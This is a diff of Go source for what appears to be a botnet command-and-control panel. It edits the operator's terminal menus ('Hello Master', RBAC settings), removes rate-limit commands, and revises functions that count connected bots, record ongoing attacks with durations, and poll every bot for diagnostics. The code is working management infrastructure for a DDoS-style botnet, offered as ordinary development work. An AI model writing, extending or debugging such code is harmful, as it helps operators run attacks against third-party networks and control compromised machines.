-					conn.Write([]byte("\r\n"))
 					conn.Write([]byte("\x1b[38;5;231m╭══════════════════════════════════════════════════════════════════════════════╮\n\r"))
 					conn.Write([]byte("\x1b[38;5;231m║                                 \x1b[38;5;51mAdmin Menu\x1b[38;5;231m                                   ║\n\r"))
 					conn.Write([]byte("\x1b[38;5;231m╠══════════════════════════════════════════════════════════════════════════════╢\n\r"))
@@ -1025,7 +1031,6 @@ func handleRequest(conn *tls.Conn) {
 					conn.Write([]byte("\033[3J\033[H\033[2J"))
 					conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
 					conn.Write([]byte("\033[2J\033[H"))
-					conn.Write([]byte("\r\n"))
 					conn.Write([]byte("\r\n"))
 					conn.Write([]byte("\x1b[38;5;231m╭══════════════════════════════════════════════════════════════════════════════╮\n\r"))
 					conn.Write([]byte("\x1b[38;5;231m║                               \x1b[38;5;51mHello Master\x1b[38;5;231m                                   ║\n\r"))
@@ -1205,7 +1210,6 @@ func handleRequest(conn *tls.Conn) {
 					conn.Write([]byte("\x1b[38;5;231m║ \x1b[38;5;45mUsername        Level     Expiration\x1b[38;5;231m          ║    └─┘ └─┘ └─┘ └─┘ └─┘       ║\n\r"))
 					conn.Write([]byte("\x1b[38;5;231m╠═══════════════════════════════════════════════╩══════════╦═══════════════════╣\n\r"))
 
-					// Display users with alternating bullets
 					for i, line := range content {
 						if len(line) > 76 {
 							line = line[:76]
@@ -1265,26 +1269,54 @@ func handleRequest(conn *tls.Conn) {
 						conn.Write([]byte("\033[2J\033[H"))
 						conn.Write([]byte("\033[3J\033[H\033[2J"))
 						conn.Write([]byte("\x1b[?1049h\x1b[3J\x1b[H\x1b[2J\x1b[?25l"))
-						conn.Write([]byte("\x1b[38;5;231m╭══════════════════════════════════════════════════════════════════════════════╮\n\r"))
-						conn.Write([]byte("\x1b[38;5;231m║                          \x1b[38;5;51mRBAC Configuration\x1b[38;5;231m                                  ║\n\r"))
-						conn.Write([]byte("\x1b[38;5;231m╠══════════════════════════════════════════════════════════════════════════════╢\n\r"))
-						for method, levels := range perms {
-							// Method name - 20 chars max
-							displayMethod := method
-							if len(displayMethod) > 20 {
-								displayMethod = displayMethod[:17] + "..."
+						conn.Write([]byte("\r\n"))
+						conn.Write([]byte("\x1b[38;5;231m╭──────────────────────────────────────────────────────────────────────────────╮\n\r"))
+						conn.Write([]byte("\x1b[38;5;231m│                          \x1b[38;5;51mRBAC Configuration\x1b[38;5;231m                                  │\n\r"))
+						conn.Write([]byte("\x1b[38;5;231m├──────────────────────────────────────────────────────────────────────────────┤\n\r"))
+
+						if len(perms) == 0 {
+							conn.Write([]byte("\x1b[38;5;231m│                                                                              │\n\r"))
+							conn.Write([]byte("\x1b[38;5;231m│                              \x1b[38;5;196mNo permissions configured\x1b[38;5;231m                             │\n\r"))
+							conn.Write([]byte("\x1b[38;5;231m│                                                                              │\n\r"))
+						} else {
+							methods := make([]string, 0, len(perms))
+							for method := range perms {
+								methods = append(methods, method)
+							}
+							sort.Strings(methods)
+
+							maxDisplay := 16
+							if len(methods) > maxDisplay {
+								methods = methods[:maxDisplay]
 							}
 
-							// Levels - 52 chars max (allows for longer level lists)
-							levelsStr := strings.Join(levels, ", ")
-							if len(levelsStr) > 52 {
-								levelsStr = levelsStr[:49] + "..."
+							for _, method := range methods {
+								levels := perms[method]
+
+								displayMethod := method
+								if len(displayMethod) > 15 {
+									displayMethod = displayMethod[:12] + "..."
+								}
+
+								levelsStr := strings.Join(levels, ", ")
+								if len(levelsStr) > 50 {
+									levelsStr = levelsStr[:47] + "..."
+								}
+
+								line := fmt.Sprintf("\x1b[38;5;231m│ \x1b[38;5;45m%-15s \x1b[38;5;231m: \x1b[38;5;82m%-50s \x1b[38;5;231m│", displayMethod, levelsStr)
+								conn.Write([]byte(line + "\n\r"))
 							}
 
-							line := fmt.Sprintf("║  %-20s : %-52s ║", displayMethod, levelsStr)
-							conn.Write([]byte(line + "\n\r"))
+							if len(perms) > maxDisplay {
+								remaining := len(perms) - maxDisplay
+								conn.Write([]byte("\x1b[38;5;231m│                                                                              │\n\r"))
+								conn.Write([]byte(fmt.Sprintf("\x1b[38;5;231m│                      \x1b[38;5;226m... and %d more methods not displayed ...\x1b[38;5;231m                     │\n\r", remaining)))
+							}
 						}
-						conn.Write([]byte("\x1b[38;5;231m╰══════════════════════════════════════════════════════════════════════════════╯\n\r"))
+
+						conn.Write([]byte("\x1b[38;5;231m├──────────────────────────────────────────────────────────────────────────────┤\n\r"))
+						conn.Write([]byte("\x1b[38;5;231m│              \x1b[38;5;51mUse 'rbac <method> get/set' to modify permissions\x1b[38;5;231m               │\n\r"))
+						conn.Write([]byte("\x1b[38;5;231m╰──────────────────────────────────────────────────────────────────────────────╯\n\r"))
 						continue
 					}
 
@@ -1337,30 +1369,6 @@ func handleRequest(conn *tls.Conn) {
 					default:
 						writeError(conn, "Invalid action. Use 'set' or 'get'")
 					}
-				case "userlevels":
-					levels := GetUserLevels()
-					conn.Write([]byte("Available user levels:\n\r"))
-					for i, level := range levels {
-						conn.Write([]byte(fmt.Sprintf("%d. %s\n\r", i+1, level)))
-					}
-				case "ratelimit":
-					if len(parts) > 1 && parts[1] == "reset" && client.user.GetLevel() <= Admin {
-						targetUser := client.user.Username
-						if len(parts) > 2 {
-							targetUser = parts[2]
-						}
-						ResetUserRateLimits(targetUser)
-						writeSuccess(conn, fmt.Sprintf("Rate limits reset for %s", targetUser))
-						continue
-					}
-
-					info := GetRateLimitInfo(client.user.Username)
-					conn.Write([]byte("Rate Limit Status:\n\r"))
-					for limitType, data := range info {
-						limitData := data.(map[string]interface{})
-						conn.Write([]byte(fmt.Sprintf("%s: %d remaining, blocked: %v\n\r",
-							limitType, limitData["remaining"], limitData["blocked"])))
-					}
 				default:
 					conn.Write([]byte("Invalid command. Type 'help' for available commands.\n\r"))
 				}
@@ -1369,21 +1377,28 @@ func handleRequest(conn *tls.Conn) {
 	}
 }
 
-// Remove the global botCount and use connection pool size instead
 func getBotCount() int {
-	return int(atomic.LoadInt32(&connectionPool.currentSize))
+	activeBots := GetActiveBotInfos()
+	count := len(activeBots)
+	if count == 0 {
+		count = heartbeatManager.GetBotCount()
+	}
+	if count == 0 {
+		count = botManager.Count()
+	}
+	return count
 }
 
 func RecordAPIAttack(a Attack) string {
 	id := fmt.Sprintf("%d-%s", time.Now().UnixNano(), a.user)
-	apiAttackLock.Lock()
+	ongoingAPIAttacksMutex.Lock()
 	ongoingAPIAttacks[id] = a
-	apiAttackLock.Unlock()
+	ongoingAPIAttacksMutex.Unlock()
 	go func(id string, a Attack) {
 		time.Sleep(a.duration)
-		apiAttackLock.Lock()
+		ongoingAPIAttacksMutex.Lock()
 		delete(ongoingAPIAttacks, id)
-		apiAttackLock.Unlock()
+		ongoingAPIAttacksMutex.Unlock()
 	}(id, a)
 
 	return id
@@ -1400,13 +1415,25 @@ func GetAllOngoingAttacks() []Attack {
 	}
 	attackLock.Unlock()
 
-	apiAttackLock.Lock()
+	ongoingAPIAttacksMutex.RLock()
 	for _, a := range ongoingAPIAttacks {
 		if time.Now().Before(a.start.Add(a.duration)) {
 			combined = append(combined, a)
 		}
 	}
-	apiAttackLock.Unlock()
+	ongoingAPIAttacksMutex.RUnlock()
 
 	return combined
+}
+
+func ScheduleDiagnosticRequests() {
+	ticker := time.NewTicker(5 * time.Minute)
+	defer ticker.Stop()
+
+	for range ticker.C {
+		allBots := botManager.GetAllBots()
+		for _, botConn := range allBots {
+			go RequestDiagnostics(botConn)
+		}
+	}
 }
